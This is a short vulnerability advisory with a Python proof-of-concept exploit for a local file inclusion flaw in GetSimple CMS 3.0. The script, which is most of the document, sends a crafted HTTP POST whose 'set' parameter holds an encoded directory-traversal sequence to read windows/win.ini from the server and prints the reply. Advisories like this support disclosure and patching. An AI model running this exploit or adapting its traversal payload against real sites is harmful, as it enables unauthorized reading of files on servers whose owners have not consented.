# ------------------------------------------------------------------------
# Software................GetSimple 3.0
# Vulnerability...........Local File Inclusion
# Threat Level............Critical (4/5)
# Download................http://get-simple.info/
# Discovery Date..........5/4/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ------------------------------------------------------------------------
# 
# 
# --Description--
# 
# A local file inclusion vulnerability in GetSimple 3.0 can be exploited
# to include arbitrary files.
# 
# 
# --PoC--

import socket

host = 'localhost'
path = '/getsimple_3.0'
trav_sequence = '..%2f' * 8 + 'windows%2fwin.ini'
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.settimeout(8)

s.send('POST ' + path + '/index.php?set=' + trav_sequence + ' HTTP/1.1\r\n'
       'Host: localhost\r\n'
       'Proxy-Connection: keep-alive\r\n'
       'User-Agent: x\r\n'
       'Content-Length: 0\r\n'
       'Cache-Control: max-age=0\r\n'
       'Origin: null\r\n'
       'Content-Type: multipart/form-data; boundary=----x\r\n'
       'Accept: text/html\r\n'
       'Accept-Language: en-US,en;q=0.8\r\n'
       'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
       '\r\n')

resp = s.recv(8192)

print resp

